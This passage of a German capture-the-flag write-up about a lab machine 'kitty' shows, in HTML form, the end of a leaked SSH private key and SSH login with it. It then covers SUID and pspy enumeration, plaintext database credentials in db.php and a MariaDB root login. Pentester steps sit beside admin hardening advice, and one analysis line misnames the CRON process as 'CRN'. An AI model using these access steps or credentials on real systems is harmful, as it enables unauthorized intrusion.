+/DvWcJPX31vCDJdNubw3wyCPqmoR9biGhzFIwcotcwSHnAX3y2f6+ukUX1bisSCLzZ01l2
+/zA6yG6JBuoC8Tbw/rC70CYQ8CWRcHyuNLAXv/N4rFb5mAlbXQA2Tc03ai/V9k4vW3iAI
+X7gcto4LzGGi0WbCTyN5YfAg6GsTXeyjcSrpbY3Rz+yFxJ4LMZAbvYWvaYsf/fDIPx
+syLVgEHSDhBHl4HMcv5k9J6+llEwAAAAMBAAEAAAGBAJe1M48oT9TJyDr0iVtlJjcraU
+S3NXY7SGc1I5V6lC0rtszPxBhEY+nADXLi3pTRR9YGp87DA4+y23jhjFs2xkvShZfL2TG
+XVBphVuoaxiBaEzYTlh7B9yMyckuX8uQdP3yT1HdGPk2pb4YydZcuuvcllENGUhxBTLP
+DpRVgIkZPEurzb5WcL1+3BQr+0V9xEl3uxqMwBQhNGCx1Tr7iIyvW4Q+r2FKHzyaCVly
+4KN9o6fLRKY94N0K1yCpKSa3BJxDVPmI0XEUKnKH1CothWXzR7CcPlkftSKevsTND53Ka
+IHfADJ7XcYb7W4kR8pE8NhtTJEA7fXEFfmyUDgvXZTz0ndII59rFeDb6LYfrtM484wkk
+6LBTV3Qd5RSTPHpLAX0qzv0EllRypuNRHnP8/6mP0oavtBWsuzAMgYAwGC6P7ucgQo5U0w
+TaD4eM/h/TMbCQTlz4kDJloe8KKR1V/Ffksh+/MXRzkYUW2qBM3alGhstp5zPuYMDCQAA
+AMEAj37ikrR2oFzNYmd0kb2ap6EHAPjz9mJ6KkDaInPy6zVU3ikYoB2wR20ERTpuKAlpE
+jLtQRDk3mto22zCA3lzr2kHz1I3ELQc/FHyu5VLKAIG00G+KKCKvISLuZA4IYRR80mp2M
+2dVBLXiI2SUU7CAEXtvZChlqX+qSj5W3cAQjLGSfzg3ofJ3dXwGvVVoUzwIqI9JXdynF
+7QZiAzaNq9cim8kH55gxi6mrd9cIDVF5TnKucrATUviBrQCDAqAAAAwQDcNpuetSiDH5Rq
+BLd4RVQa1U0j3qQzqLuTjMMdq18DIybReMjNpZqizqtzUv+Esg8iWmvoKEu4Yx/fWbvI+
+Mx8EGEvBljT8qUP8/aF2viUh30v8pdEcH4o1ii0XTij399gZ+PAFsKJ2IG1Sjv6SbvMdD
+DXndrEmeKqerJANjyPUtDf+jMt81wJRXF+jYL+Eez+s1o0dLiwTha9svQ9g9pNibaEzt
+3y4kws+MWU+jNz3NA0C+X/5GZeKRpURncAAADBANbbVAY1joRW27oxzKNjsxuYp81uEbsZ
+9UpavYL+eR7HFSjzk6qt4XD88L+y5G5tohog5iS6c4wr/pXfIA3uWuSkdYSzWVYlkfxC
+hFETtqdJAnfFGWpXc52lU1511VI9rfCPfDvAjvsGxxcZpPUduGuP4KpdGfwJXYQqClhv4
+Iv7yKjFG5VUvKq2qhcyS8zB3/ezloxdt/yVEfqGTm90pNelGLGEj8g95Q+aPgPharLlDQ
+hT8vaVsxulundRRQAAABNkeXV0aWRoYXJhQGZyZWU0YWxsAQIDBAUG
+-----END OPENSSH PRIVATE KEY-----
+</span></pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, sich per SSH auf dem Zielsystem (`kitty.hmv`) als Benutzer `dyutidhara` anzumelden. Es wird die Option `-i idr` verwendet, was darauf hindeutet, dass der zuvor gefundene private Schlüssel in einer Datei namens `idr` gespeichert wurde. *Hinweis: Der Dateiname `idr` unterscheidet sich von meinem Vorschlag `id_rsa_kitty`. Wahrscheinlich wurde der Schlüssel in `idr` gespeichert und die Berechtigungen angepasst (`chmod 600 idr`).*</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Die Anmeldung ist erfolgreich!</span> Wir erhalten eine Shell als Benutzer `dyutidhara` auf dem Zielsystem `kitty`. Die Systeminformationen (Debian 5.10) und die letzte Login-Zeit werden angezeigt. Dies bestätigt, dass der gefundene SSH-Schlüssel gültig war und der Benutzer `dyutidhara` existiert und per SSH erreichbar ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der initiale Zugriff wurde erlangt. Nächste Schritte:
+             <ol><li>Suchen Sie nach der User-Flag (oft in `/home/dyutidhara/user.txt`).</li><li>Führen Sie grundlegende Enumeration auf dem Zielsystem durch (Benutzerrechte prüfen mit `id`, `sudo -l`; SUID-Binaries finden mit `find / -type f -perm -4000 -ls 2>/dev/null`; laufende Prozesse, Netzwerkverbindungen, Cronjobs prüfen).</li><li>Suchen Sie nach Wegen zur Rechteausweitung (Privilege Escalation).</li></ol>
+             <strong>Empfehlung (Admin):</strong> Da der Zugriff über einen kompromittierten SSH-Schlüssel erfolgte:
+             <ol><li>Widerrufen Sie den kompromittierten Schlüssel (aus `/home/dyutidhara/.ssh/authorized_keys`).</li><li>Überprüfen Sie, wie der Schlüssel ursprünglich kompromittiert wurde (hier: unsichere API) und beheben Sie die Ursache.</li><li>Überprüfen Sie die Logs (`/var/log/auth.log` oder ähnlich), um festzustellen, wann und von wo aus auf den Account zugegriffen wurde.</li><li>Erwägen Sie zusätzliche SSH-Sicherheitsmaßnahmen wie Zwei-Faktor-Authentifizierung (2FA) oder die Beschränkung des SSH-Zugriffs auf bestimmte IP-Adressen.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh dyutidhara@kitty.hmv -i idr</span></div>
+                    <pre>
+Linux kitty 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="password">Last login: Tue Mar 29 06:39:26 2022 from 192.168.1.5</span>
+<span class="prompt">dyutidhara@kitty:~$ </span></pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Nachdem der Zugriff als `dyutidhara` erlangt wurde, wird die Datei `user.txt` im Home-Verzeichnis gelesen, um die User-Flag zu erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich und gibt die User-Flag aus: `<span class="password">3702f4d1247163b61b1cd8b368539cbf</span>`. Dies ist ein typisches Ziel in Capture-the-Flag-Szenarien (CTFs) und markiert den erfolgreichen Abschluss der Phase des initialen Zugriffs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die User-Flag. Konzentrieren Sie sich nun vollständig auf die Privilege Escalation, um Root-Zugriff zu erlangen und die Root-Flag zu finden.
+            <br><strong>Empfehlung (Admin):</strong> In einer realen Umgebung sollten sensible Dateien wie Flags nicht existieren. Konzentrieren Sie sich auf die Sicherung des Benutzerkontos und die Verhinderung der Rechteausweitung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">3702f4d1247163b61b1cd8b368539cbf</span></pre>
+                </div>
+            </div>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu überprüfen, welche Befehle der aktuelle Benutzer (`dyutidhara`) mit `sudo` (also mit Root-Rechten) ausführen darf. Es wird nach dem Passwort für `dyutidhara` gefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Da das Passwort für `dyutidhara` nicht bekannt ist (der Zugriff erfolgte über einen SSH-Schlüssel), kann der Befehl nicht erfolgreich ausgeführt werden. Die Ausgabe `<span class="password">sudo: a password is required</span>` zeigt, dass `dyutidhara` keine `sudo`-Rechte ohne Passwort hat. Dies schließt einen einfachen Weg zur Rechteausweitung über `sudo` aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `sudo -l` nicht funktioniert, suchen Sie nach anderen Wegen zur Rechteausweitung: SUID-Binaries, fehlerhafte Dateiberechtigungen, Kernel-Exploits, Cronjobs, unsichere Dienste, die als Root laufen.
+            <br><strong>Empfehlung (Admin):</strong> Es ist eine gute Sicherheitspraxis, dass Benutzer Passwörter für `sudo` benötigen. Vergeben Sie `sudo`-Rechte restriktiv und nur für spezifische Befehle, wenn möglich (Least Privilege Prinzip).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for dyutidhara:
+<span class="password">sudo: a password is required</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `find` sucht im gesamten Dateisystem (`/`) nach Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). Das SUID-Bit erlaubt es, eine Datei mit den Rechten des Dateibesitzers (oft Root) auszuführen, unabhängig davon, welcher Benutzer sie startet. `-ls` zeigt detaillierte Informationen zu den gefundenen Dateien an. `2>/dev/null` leitet Fehlermeldungen (wie "Permission denied") ins Nichts um, um die Ausgabe sauber zu halten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird eine Liste von Standard-Linux-Binaries mit gesetztem SUID-Bit gefunden (z.B. `pkexec`, `gpasswd`, `sudo`, `passwd`, `umount`, `chsh`, `su`, `chfn`, `newgrp`, `mount`, `ssh-keysign`, `dbus-daemon-launch-helper`, `polkit-agent-helper-1`). Diese sind oft notwendig für die Systemfunktion. Es ist wichtig zu prüfen, ob bekannte Schwachstellen in den spezifischen Versionen dieser Binaries existieren oder ob sie auf ungewöhnliche Weise ausgenutzt werden können. Auf den ersten Blick sind hier keine offensichtlich benutzerdefinierten oder ungewöhnlichen SUID-Dateien zu sehen, die oft ein leichteres Ziel darstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Überprüfen Sie die Versionen der gefundenen SUID-Binaries (z.B. `pkexec --version`) auf bekannte Exploits (wie PwnKit für `pkexec`).</li><li>Suchen Sie nach ungewöhnlichen SUID-Dateien in nicht standardmäßigen Verzeichnissen.</li><li>Prüfen Sie andere Vektoren für die Rechteausweitung.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Minimieren Sie die Anzahl der SUID-Binaries auf das absolut Notwendige.</li><li>Entfernen Sie das SUID-Bit von Binaries, wenn es nicht zwingend benötigt wird (`chmod u-s /pfad/zur/datei`).</li><li>Halten Sie das System und alle Pakete aktuell, um bekannte Schwachstellen in SUID-Programmen zu patchen.</li><li>Überwachen Sie das Dateisystem auf neu erstellte SUID-Dateien.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre><span class="command">
+    16622     24 -rwsr-xr-x   1 root     root        23448 Jan 13  2022 /usr/bin/pkexec
+      109     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
+    18979    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo
+      110     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
+     3747     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
+      107     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
+     3457     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
+      106     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
+     3596     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
+     3746     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
+   268059    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+   137330     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    16625     20 -rwsr-xr-x   1 root     root          19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1</span></pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `pspy64` wird in das `/tmp`-Verzeichnis hochgeladen (vermutlich zuvor per `scp` oder `wget`), ausführbar gemacht (`chmod +x`) und gestartet. `pspy` ist ein Tool zur Überwachung von Linux-Prozessen ohne Root-Rechte. Es lauscht auf Prozess-Erstellungsereignisse und kann helfen, automatisierte Aufgaben oder Cronjobs zu entdecken, die möglicherweise für Privilege Escalation ausgenutzt werden können.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `pspy` startet und listet die initial laufenden Prozesse auf. Die Ausgabe zeigt verschiedene System- und Benutzerprozesse, darunter den SSH-Daemon (`sshd`), Webserver (`nginx`, `php-fpm`, `gitea`, `uvicorn`), Datenbank (`mariadbd`) und den `pspy64`-Prozess selbst. Besonders auffällig sind die wiederkehrenden `CMD: UID=0 PID=... | /usr/sbin/CRN -f`-Einträge. Dies deutet stark auf einen Cronjob hin, der sehr häufig (möglicherweise jede Minute oder öfter) als Root (`UID=0`) ausgeführt wird. Der Prozessname `CRN` ist ungewöhnlich und könnte ein verschleierter oder benutzerdefinierter Prozess sein, der mit Cron zusammenhängt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Untersuchen Sie die System-Cronjobs (`/etc/crontab`, `/etc/cron.d/`, `/etc/cron.hourly/`, etc.) und Benutzer-Cronjobs (`crontab -l`) genauer, um herauszufinden, welcher Job den `/usr/sbin/CRN -f`-Prozess startet.</li><li>Finden Sie heraus, was dieser Prozess genau tut. Prüfen Sie, ob er auf Dateien zugreift, auf die der Benutzer `dyutidhara` Schreibrechte hat.</li><li>Wenn der Cronjob manipulierbar ist (z.B. durch Schreiben in eine von ihm gelesene Datei oder Ersetzen eines von ihm ausgeführten Skripts), könnte dies ein Vektor zur Rechteausweitung sein.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Überprüfen Sie regelmäßig die konfigurierten Cronjobs.</li><li>Stellen Sie sicher, dass Cronjobs nur mit den minimal notwendigen Rechten laufen.</li><li>Überprüfen Sie die Berechtigungen von Dateien und Skripten, die von Cronjobs verwendet werden, um unbefugte Modifikationen zu verhindern.</li><li>Verwenden Sie aussagekräftige Prozessnamen anstelle von unklaren Namen wie `CRN`.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">chmod +x pspy64</span></div>
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">./pspy64</span></div>
+                    <pre>
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░░ ██▒▒██    ▒ ▓██░░ ██▒▒██  ██▒
+    ▓██░ ██▓▒ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒   ▒   ██▒▒██▄█▓▒ ▒░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒░▒██▒ ░  ░ ██▒▓░
+    ▒▓▒░ ░  ░ ▒▓▒ ▒ ░░▓▒░ ░  ░ ██▒▒▒
+    ░▒ ░      ░   ▒  ░ ▒      ▓██ ▒ ░
+    ░░      ░  ░  ░   ░      ▒ ▒ ░░
+                               ░ ░
+                               ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=9      |</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=1000 PID=820    | ./pspy64</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=1000 PID=773    | -bash</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=1000 PID=772    | sshd: dyutidhara@pts/0</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=1000 PID=748    | (sd-pam)</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=1000 PID=747    | /lib/systemd/systemd --user</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=744    | sshd: dyutidhara [priv]</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=108  PID=541    | /usr/local/bin/gitea web -c /etc/gitea/app.ini</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=33   PID=526    | php-fpm: pool www</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=33   PID=525    | php-fpm: pool www</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=52     |</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=33   PID=517    | nginx: worker process</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=516    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=514    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=107  PID=513    | /usr/sbin/mariadbd</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=51     |</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=33   PID=436    | /usr/bin/python3 -m uvicorn main:app</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=432    | /sbin/agetty -o -p -- \\u --noclear tty1 linux</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=431    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=43     |</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=425    | php-fpm: master process (/etc/php/7.3/fpm/php-fpm.conf)</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=33   PID=422    | /usr/bin/bash /usr/local/src/FastAPI/run.sh</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=418    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=4      |</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=389    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=381    | /lib/systemd/systemd-logind</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=379    | /usr/sbin/rsyslogd -n -iNONE</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=104  PID=376    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=375    | /usr/sbin/cron -f</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=101  PID=296    | /lib/systemd/systemd-timesyncd</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=290    | /lib/systemd/systemd-udevd</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=270    | /lib/systemd/systemd-journald</span>
+<span class="command">2022/10/20 06:18:26 CMD: UID=0    PID=1      | /sbin/init</span>
+<span class="password">2022/10/20 06:19:01 CMD: UID=0    PID=828    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:19:01 CMD: UID=0    PID=829    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:20:01 CMD: UID=0    PID=830    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:20:01 CMD: UID=0    PID=831    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:21:01 CMD: UID=0    PID=832    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:21:01 CMD: UID=0    PID=833    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:22:01 CMD: UID=0    PID=838    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:22:01 CMD: UID=0    PID=840    | /usr/sbin/CRON -f</span>
+<span class="command">2022/10/20 06:22:15 CMD: UID=0    PID=841    |</span>
+<span class="password">2022/10/20 06:23:01 CMD: UID=0    PID=842    | /usr/sbin/CRON -f</span>
+<span class="password">2022/10/20 06:23:01 CMD: UID=0    PID=843    | /usr/sbin/CRON -f</span>
+<span class="command">2022/10/20 06:23:32 CMD: UID=0    PID=844    |</span>
+<span class="password">2022/10/20 06:23:57 CMD: UID=0    PID=845    | sshd: [accepted]</span>
+<span class="password">2022/10/20 06:23:57 CMD: UID=0    PID=846    | sshd: [accepted]</span>
+</pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Nachdem `pspy` auf einen häufig laufenden Root-Cronjob hingewiesen hat, wird die Datei `/var/www/cookie/config/db.php` untersucht. Dies ist eine typische Datei, die Datenbank-Zugangsdaten enthält und wurde wahrscheinlich durch die vorherige `gobuster`-Enumeration des `/config`-Verzeichnisses oder durch manuelle Untersuchung des Web-Roots gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält auskommentierte Zugangsdaten (`root`/`root`) und aktive Zugangsdaten für eine MySQL/MariaDB-Datenbank:
+            <ul><li>Host: `localhost`</li><li>Benutzer: `<span class="command">padding</span>`</li><li>Passwort: `<span class="password">ihateyouadmin</span>`</li><li>Datenbankname: `padding`</li></ul>
+            Dies ist ein wichtiger Fund, da Datenbanken oft weitere sensible Informationen, Benutzerdaten oder Hashes enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Versuchen Sie, sich mit den gefundenen Zugangsdaten (`padding`:`ihateyouadmin`) bei der lokalen MariaDB-Instanz anzumelden (`mysql -u padding -p`).</li><li>Wenn die Anmeldung erfolgreich ist, enumerieren Sie die Datenbanken (`show databases;`), wechseln Sie zur `padding`-Datenbank (`use padding;`), listen Sie Tabellen auf (`show tables;`) und untersuchen Sie deren Inhalt (`select * from users;`, `select * from salt;`, etc.).</li><li>Suchen Sie nach Benutzer-Hashes, anderen Zugangsdaten oder Hinweisen auf weitere Schwachstellen.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Speichern Sie Datenbank-Zugangsdaten nicht im Klartext in Konfigurationsdateien im Web-Root. Lagern Sie sie außerhalb des Web-Roots oder verwenden Sie sicherere Methoden wie Umgebungsvariablen oder Konfigurationsmanagement-Tools.</li><li>Verwenden Sie für Datenbankbenutzer starke, eindeutige Passwörter.</li><li>Beschränken Sie die Berechtigungen von Datenbankbenutzern auf das absolut Notwendige (Least Privilege). Der Benutzer, den die Webanwendung verwendet, benötigt selten Zugriff auf andere Datenbanken als die eigene.</li><li>Entfernen Sie auskommentierte, aber potenziell gültige Zugangsdaten aus Konfigurationsdateien.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/var/www/cookie$ <span class="command">cat config/db.php</span></div>
+                    <pre>
+&lt;?php
+
+#define('DB_Server', 'localhost');
+#define('DB_Username', 'root');
+#define('DB_Password','root');
+#define('DB_Name', 'overflow');
+
+$lnk = mysqli_connect("<span class="command">localhost</span>","<span class="command">padding</span>", "<span class="password">ihateyouadmin</span>","<span class="command">padding</span>");
+$db = mysqli_select_db($lnk,"padding");
+
+if($db == false){
+    die('Cannot Connect to Database');
+}
+
+?&gt;</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es werden mehrere Versuche unternommen, sich an der lokalen MariaDB-Instanz anzumelden, basierend auf den Funden in `db.php` und allgemeinen Vermutungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+            <ul><li>`mysql -u localhost -p`: Fehler `Access denied for user 'localhost'@'localhost'`. Der Benutzername ist falsch.</li><li>`mysql -u root -p`: Fehler `Access denied for user 'root'@'localhost'`. Das eingegebene Passwort (wahrscheinlich `root` aus dem Kommentar in `db.php`) ist falsch oder der Root-Login per Passwort ist deaktiviert.</li><li>`mysql -u root`: Fehler `Access denied for user 'root'@'localhost'`. Root-Login ohne Passwort ist nicht erlaubt.</li><li>`mysql -u git -p`: Fehler `Access denied for user 'git'@'localhost'`. Benutzer `git` existiert oder hat kein Passwortzugriff.</li><li>`mysql -u root -p` (mit Passwort `<span class="password">root</span>`): <span class="password">Erfolgreich!</span> Entgegen der vorherigen Fehlermeldung funktioniert der Login als `root` mit dem Passwort `root` (das auskommentiert war). Dies ist eine erhebliche Fehlkonfiguration.</li></ul>
+            Der erfolgreiche Login als Datenbank-Root eröffnet weitreichende Möglichkeiten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Da Sie nun Root-Zugriff auf die Datenbank haben, enumerieren Sie alle Datenbanken (`show databases;`).</li><li>Untersuchen Sie interessante Datenbanken wie `mysql` (für Benutzer und Berechtigungen), `gitea`, `opencats`, `padding`.</li><li>Suchen Sie nach Benutzer-Hashes, Klartextpasswörtern, API-Schlüsseln oder anderen sensiblen Daten.</li><li>Prüfen Sie, ob Sie über Datenbankfunktionen Dateien schreiben oder Befehle ausführen können (z.B. `SELECT ... INTO OUTFILE`, UDF-Exploits - obwohl dies oft eingeschränkt ist).</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Ändern Sie sofort das MariaDB-Root-Passwort zu einem starken, einzigartigen Passwort.</li><li>Konfigurieren Sie MariaDB so, dass der Root-Login nur über Unix-Sockets oder von vertrauenswürdigen Hosts erlaubt ist, nicht per Passwort von `localhost` wenn nicht unbedingt nötig.</li><li>Entfernen Sie sensible Informationen (wie Passwörter) aus Kommentaren in Konfigurationsdateien.</li><li>Überprüfen Sie die Notwendigkeit aller Datenbankbenutzer und deren Berechtigungen.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/var/www/cookie$ <span class="command">mysql -u localhost -p</span></div>
+                    <pre>Enter password:
+<span class="password">ERROR 1045 (28000): Access denied for user 'localhost'@'localhost' (using password: YES)</span></pre>
+                    <div class="prompt">dyutidhara@kitty:/var/www/cookie$ <span class="command">mysql -u root -p</span></div>
+                    <pre>Enter password:
+<span class="password">ERROR 1698 (28000): Access denied for user 'root'@'localhost'</span></pre>
+                    <div class="prompt">dyutidhara@kitty:/var/www/cookie$ <span class="command">mysql -u root</span></div>
+                    <pre><span class="password">ERROR 1698 (28000): Access denied for user 'root'@'localhost'</span></pre>
+                    <div class="prompt">dyutidhara@kitty:/var/www/cookie$ <span class="command">mysql -u git -p</span></div>
+                    <pre>Enter password:
+<span class="password">ERROR 1698 (28000): Access denied for user 'git'@'localhost'</span></pre>
+                     <div class="prompt">dyutidhara@kitty:/var/www/cookie$ <span class="command">mysql -u root -p</span></div>
+                     <pre>Enter password: <span class="comment">(Passwort 'root' eingegeben)</span>
+<span class="password">Welcome to the MariaDB monitor.</span>  Commands end with ; or \g.
+Your MariaDB connection id is 112
+Server version: 10.5.15-MariaDB-1:10.5.15+maria~bullseye mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+<span class="prompt">MariaDB [(none)]> </span></pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Mit Root-Zugriff auf die Datenbank werden die verfügbaren Datenbanken aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden mehrere Datenbanken angezeigt: `<span class="command">gitea</span>`, `information_schema`, `mysql`, `<span class="command">opencats</span>`, `<span class="command">padding</span>`, `performance_schema`. Neben den Standard-Datenbanken (`information_schema`, `mysql`, `performance_schema`) sind `gitea`, `opencats` und `padding` anwendungsspezifisch und potenzielle Quellen für weitere Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Tabellen und Inhalte der Datenbanken `gitea`, `opencats` und `padding`. Beginnen Sie mit `padding`, da die Zugangsdaten dafür zuerst gefunden wurden, und dann `gitea`, da Gitea oft interessante Daten enthält (Repositories, Benutzer, API-Schlüssel).
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Anwendungsdatenbanken (`gitea`, `opencats`, `padding`) nur von den dafür vorgesehenen, berechtigten Benutzern zugänglich sind und nicht vom Datenbank-Root-Benutzer manipuliert werden müssen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                    <pre>
++--------------------+
+| Database           |
++--------------------+
+| <span class="command">gitea</span>              |
+| information_schema |
+| mysql              |
+| <span class="command">opencats</span>           |
+| <span class="command">padding</span>            |
+| performance_schema |
++--------------------+
+6 rows in set (0.026 sec)
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die `gitea`-Datenbank wird ausgewählt (`use gitea;` - nicht im Text gezeigt, aber impliziert) und der Inhalt der `user`-Tabelle abgefragt.</p>
